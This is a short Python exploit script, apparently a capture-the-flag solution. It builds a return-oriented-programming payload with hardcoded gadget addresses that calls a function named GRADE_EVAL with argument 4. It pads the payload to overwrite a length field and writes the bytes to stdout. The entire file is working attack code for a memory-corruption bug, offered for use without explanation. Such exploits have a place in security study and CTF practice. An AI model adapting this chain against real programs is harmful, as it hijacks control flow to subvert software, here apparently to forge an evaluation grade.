import sys

GRADE_EVAL = 0x401677
POP_RDI_RET = 0x4018A3
RET = 0x4018A4
EXPR_SIZE = 128
LEN_OFFSET = 0x100
LEN_TO_RET = 0xA8
def q(value: int) -> bytes:
    return value.to_bytes(8, "little")

chain = b"".join([
        q(RET),
        q(POP_RDI_RET),
        q(4),
        q(GRADE_EVAL),
        q(0),
    ])
payload = chain
payload += b"A" * (LEN_OFFSET - len(payload))
payload += LEN_TO_RET.to_bytes(4, "little")

sys.stdout.buffer.write(payload)

